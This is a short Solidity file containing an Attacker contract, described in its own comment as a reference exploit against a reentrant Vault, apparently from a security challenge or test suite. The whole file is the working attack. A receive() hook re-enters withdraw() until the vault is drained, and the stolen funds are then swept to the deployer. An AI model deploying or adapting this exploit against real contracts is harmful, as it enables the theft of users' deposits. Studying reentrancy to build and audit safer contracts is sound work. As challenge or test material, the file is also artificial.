// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;

    function withdraw() external;
}

/// @title Attacker -- reference exploit for the reentrant Vault.
///
/// pwn() deposits one unit, then calls withdraw(). While the vault pays us, its
/// receive() hook re-enters withdraw() as long as the vault still holds at least
/// our unit -- draining every seeded deposit. Funds are swept to the deployer.
contract Attacker {
    IVault public immutable vault;
    address public immutable owner;
    uint256 public unit;

    constructor(address v) {
        vault = IVault(v);
        owner = msg.sender;
    }

    function pwn() external payable {
        unit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
        // sweep everything we drained back to the operator
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {
        if (address(vault).balance >= unit) {
            vault.withdraw();
        }
    }
}
